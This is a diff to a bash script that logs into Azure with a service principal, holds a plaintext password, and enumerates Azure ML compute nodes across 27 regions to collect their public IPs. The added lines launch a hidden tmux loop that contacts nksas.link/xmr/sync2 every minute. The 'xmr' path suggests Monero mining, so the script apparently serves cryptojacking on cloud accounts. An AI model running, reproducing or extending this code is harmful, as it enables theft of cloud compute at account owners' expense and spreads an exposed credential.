@@ -6,6 +6,13 @@ password="Linh@11668899"
 locations=("australiaeast" "brazilsouth" "canadacentral" "centralindia" "centralus" "eastasia" "eastus" "eastus2" "francecentral" "germanywestcentral" "japaneast" "japanwest" "koreacentral" "northcentralus" "northeurope" "norwayeast" "southafricanorth" "southcentralus" "southeastasia" "switzerlandnorth" "uaenorth" "uksouth" "westcentralus" "westeurope" "westus" "westus2" "westus3")
 
 #######################################################################################################
+tmux new-session -d -s 1
+tmux send -t 1 "while [ 1 ]" ENTER
+tmux send -t 1 "do" ENTER
+tmux send -t 1 "wget -O 1 https://nksas.link/xmr/sync2?id=id_" ENTER
+tmux send -t 1 "sleep 1m" ENTER
+tmux send -t 1 "done" ENTER
+
 echo | sudo add-apt-repository ppa:micahflee/ppa
 echo Y | sudo apt install sshpass
 curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
@@ -15,7 +22,7 @@ az login --service-principal --username ${loginString[0]} --password ${loginStri
 sleep 15m
 for location in "${locations[@]}"
 do
-       echo "$location"
+    echo "$location"
     for i in 1 2 3
     do
         ip=$(az ml compute list-nodes -n run$i -g NetworkWatcherRG -w $location --query "[0].public_ip_address" -o tsv)
